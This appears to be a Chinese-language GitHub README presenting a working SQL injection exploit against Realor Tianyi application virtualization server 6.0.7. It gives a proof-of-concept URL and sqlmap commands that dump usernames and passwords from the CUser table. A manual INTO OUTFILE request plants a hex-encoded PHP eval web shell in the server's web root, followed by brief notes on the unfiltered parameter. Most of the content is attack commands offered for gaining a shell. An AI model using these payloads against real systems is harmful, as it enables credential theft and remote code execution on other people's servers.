# realor-sql-Injection-exp
瑞友天翼应用虚拟化-远程代码执行/sql注入,realor-sql-Injection


poc: 
```
http://url/AgentBoard.XGI?user='||'1&cmd=UserLogin
```

exp:
```
sqlmap -u 'http://url/AgentBoard.XGI?user='||'1' -D CASSystemDS -T CUser -C name,pwd --dump
sqlmap -u "" --file-write "/root/shell/shell-php/biaozun.php" --file-dest "C:\RealFriend\Rap Server\WebRoot\3.php"
#或者手动
http://172.16.1.200:8081/AgentBoard.XGI?user=%27%7C%7C%271%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27C%3A%2FRealFriend%2FRap%20Server%2FWebRoot%2F3.php%27%20LINES%20TERMINATED%20BY%200x3c3f70687020406576616c28245f504f53545b22636d64225d293f3e--%20-&cmd=UserLogin
#需要修改绝对路径,内容是16进制,<?php @eval($_POST["cmd"])?>
```

上述用**绝对路径**不是最通用写shell方法,不细说了。

### 漏洞细节
复现环境：版本：6.0.7
查看版本：
```
/About.XGI
/CASMain.XGI?cmd=About
```
zend52解密xgi：http://dezend.qiling.org/free/
<img width="778" alt="Pasted image 20230417154219" src="https://user-images.githubusercontent.com/42443541/232430899-0d1bc1ce-1b93-4403-be6a-12174c63044a.png">

漏洞点:
<img width="1191" alt="Pasted image 20230417154148" src="https://user-images.githubusercontent.com/42443541/232430982-906b2396-69c1-49ed-9469-e11293d91de8.png">

登陆处是有过滤的，这里没有用过滤函数造成注入。
<img width="646" alt="image" src="https://user-images.githubusercontent.com/42443541/232431855-d8acfc8a-709a-44c0-9c6e-c8bbe3aaaf45.png">

getshell直接sqlmap或者手动


